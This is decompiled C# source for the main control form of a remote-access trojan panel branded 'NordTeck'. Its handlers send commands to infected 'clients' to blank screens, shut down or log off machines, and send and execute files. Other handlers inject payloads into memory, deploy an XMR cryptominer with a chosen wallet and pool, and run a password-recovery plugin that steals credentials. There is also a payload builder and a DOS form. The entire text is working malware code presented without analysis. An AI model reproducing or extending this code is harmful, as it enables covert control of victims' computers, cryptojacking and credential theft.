				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "blankscreen+";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00003ECC File Offset: 0x000020CC
		private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "blankscreen-";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00003FA4 File Offset: 0x000021A4
		private void setWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					using (OpenFileDialog openFileDialog = new OpenFileDialog())
					{
						openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
						if (openFileDialog.ShowDialog() == DialogResult.OK)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Packet").AsString = "wallpaper";
							msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
							msgPack.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Packet").AsString = "plugin";
							msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
							msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
							Clients[] selectedClients = this.GetSelectedClients();
							for (int i = 0; i < selectedClients.Length; i++)
							{
								ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00004104 File Offset: 0x00002304
		private void CloseToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "close";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600002D RID: 45 RVA: 0x000041C8 File Offset: 0x000023C8
		private void RestartToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "restart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600002E RID: 46 RVA: 0x0000428C File Offset: 0x0000248C
		private void UpdateToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				using (OpenFileDialog openFileDialog = new OpenFileDialog())
				{
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").AsString = "sendFile";
						msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
						msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
						msgPack.ForcePathObject("Update").AsString = "true";
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Packet").AsString = "plugin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						foreach (Clients clients in this.GetSelectedClients())
						{
							clients.LV.ForeColor = Color.Red;
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600002F RID: 47 RVA: 0x000043F4 File Offset: 0x000025F4
		private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show(this, "Are you sure you want to unistall", "NordTeck | Unistall", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "uninstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000030 RID: 48 RVA: 0x000044D0 File Offset: 0x000026D0
		private void ShowFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				Clients[] selectedClients = this.GetSelectedClients();
				if (selectedClients.Length == 0)
				{
					Process.Start(Application.StartupPath);
				}
				else
				{
					foreach (Clients clients in selectedClients)
					{
						string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + clients.ID);
						if (Directory.Exists(text))
						{
							Process.Start(text);
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00004558 File Offset: 0x00002758
		private void RestartToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "restart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00004630 File Offset: 0x00002830
		private void ShutdownToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "shutdown";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00004708 File Offset: 0x00002908
		private void LogoffToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "logoff";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x000047E0 File Offset: 0x000029E0
		private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormBuilder formBuilder = new FormBuilder())
			{
				formBuilder.ShowDialog();
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00004818 File Offset: 0x00002A18
		private void ABOUTToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormAbout formAbout = new FormAbout())
			{
				formAbout.ShowDialog();
			}
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00004850 File Offset: 0x00002A50
		private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				object lockListviewLogs = Settings.LockListviewLogs;
				lock (lockListviewLogs)
				{
					this.listView2.Items.Clear();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000037 RID: 55 RVA: 0x000048B4 File Offset: 0x00002AB4
		private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "thumbnails";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] allClients = this.GetAllClients();
				for (int i = 0; i < allClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(allClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
		}

		// Token: 0x06000038 RID: 56 RVA: 0x0000496C File Offset: 0x00002B6C
		private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.Items.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "thumbnailsStop";
					foreach (object obj in this.listView3.Items)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(((Clients)((ListViewItem)obj).Tag).Send), msgPack.Encode2Bytes());
					}
				}
				this.listView3.Items.Clear();
				this.ThumbnailImageList.Images.Clear();
				foreach (object obj2 in this.listView1.Items)
				{
					((Clients)((ListViewItem)obj2).Tag).LV2 = null;
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00004A98 File Offset: 0x00002C98
		private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView4.SelectedItems.Count > 0)
			{
				foreach (object obj in this.listView4.SelectedItems)
				{
					((ListViewItem)obj).Remove();
				}
			}
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00004B08 File Offset: 0x00002D08
		private void TimerTask_Tick(object sender, EventArgs e)
		{
			Form1.<TimerTask_Tick>d__61 <TimerTask_Tick>d__;
			<TimerTask_Tick>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<TimerTask_Tick>d__.<>4__this = this;
			<TimerTask_Tick>d__.<>1__state = -1;
			<TimerTask_Tick>d__.<>t__builder.Start<Form1.<TimerTask_Tick>d__61>(ref <TimerTask_Tick>d__);
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00004B40 File Offset: 0x00002D40
		private void MinerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == "Miner XMR")
							{
								return;
							}
						}
					}
				}
				using (FormMiner formMiner = new FormMiner())
				{
					if (formMiner.ShowDialog() == DialogResult.OK)
					{
						if (!File.Exists("Plugins\\xmrig.bin"))
						{
							File.WriteAllBytes("Plugins\\xmrig.bin", Resources.xmrig);
						}
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").AsString = "xmr";
						msgPack.ForcePathObject("Command").AsString = "run";
						XmrSettings.Pool = formMiner.txtPool.Text;
						msgPack.ForcePathObject("Pool").AsString = formMiner.txtPool.Text;
						XmrSettings.Wallet = formMiner.txtWallet.Text;
						msgPack.ForcePathObject("Wallet").AsString = formMiner.txtWallet.Text;
						XmrSettings.Pass = formMiner.txtPass.Text;
						msgPack.ForcePathObject("Pass").AsString = formMiner.txtPool.Text;
						XmrSettings.InjectTo = formMiner.comboInjection.Text;
						msgPack.ForcePathObject("InjectTo").AsString = formMiner.comboInjection.Text;
						XmrSettings.Hash = GetHash.GetChecksum("Plugins\\xmrig.bin");
						msgPack.ForcePathObject("Hash").AsString = XmrSettings.Hash;
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Packet").AsString = "plugin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						ListViewItem listViewItem = new ListViewItem();
						listViewItem.Text = "Miner XMR";
						listViewItem.SubItems.Add("0");
						listViewItem.ToolTipText = Guid.NewGuid().ToString();
						this.listView4.Items.Add(listViewItem);
						this.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
						this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00004E10 File Offset: 0x00003010
		private void PASSWORDRECOVERYToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == "Recovery Password")
							{
								return;
							}
						}
					}
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "plugin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "Recovery Password";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				this.listView4.Items.Add(listViewItem);
				this.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				this.getTasks.Add(new AsyncTask(msgPack.Encode2Bytes(), listViewItem.ToolTipText));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00004F70 File Offset: 0x00003170
		private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "sendFile";
					msgPack.ForcePathObject("Update").AsString = "false";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00005180 File Offset: 0x00003380
		private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
				formSendFileToMemory.ShowDialog();
				if (formSendFileToMemory.toolStripStatusLabel1.Text.Length > 0 && formSendFileToMemory.toolStripStatusLabel1.ForeColor == Color.Green)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "sendMemory";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
					if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
					{
						msgPack.ForcePathObject("Inject").AsString = "";
					}
					else
					{
						msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
					}
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendMemory: " + Path.GetFileName(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString());
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
				}
				formSendFileToMemory.Close();
				formSendFileToMemory.Dispose();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x000053E8 File Offset: 0x000035E8
		private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "sendFile";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
					msgPack.ForcePathObject("Update").AsString = "true";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					this.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x000055F8 File Offset: 0x000037F8
		private bool GetListview(string id)
		{
			using (IEnumerator enumerator = Program.form1.listView4.Items.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					if (((ListViewItem)enumerator.Current).ToolTipText == id)
					{
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00005668 File Offset: 0x00003868
		private void SetExecution(string id)
		{
			foreach (object obj in Program.form1.listView4.Items)
			{
				ListViewItem listViewItem = (ListViewItem)obj;
				if (listViewItem.ToolTipText == id)
				{
					int num = Convert.ToInt32(listViewItem.SubItems[1].Text);
					num++;
					listViewItem.SubItems[1].Text = num.ToString();
				}
			}
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00005704 File Offset: 0x00003904
		private void BlockClientsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormBlockClients formBlockClients = new FormBlockClients())
			{
				formBlockClients.ShowDialog();
			}
		}

		// Token: 0x06000043 RID: 67
		[DllImport("uxtheme", CharSet = CharSet.Unicode)]
		public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

		// Token: 0x04000001 RID: 1
		private bool trans;

		// Token: 0x04000002 RID: 2
		public cGeoMain cGeoMain = new cGeoMain();

		// Token: 0x04000003 RID: 3
		private List<AsyncTask> getTasks = new List<AsyncTask>();

		// Token: 0x04000004 RID: 4
		private ListViewColumnSorter lvwColumnSorter;

		// Token: 0x04000005 RID: 5
		private readonly FormDOS formDOS;
	}
}
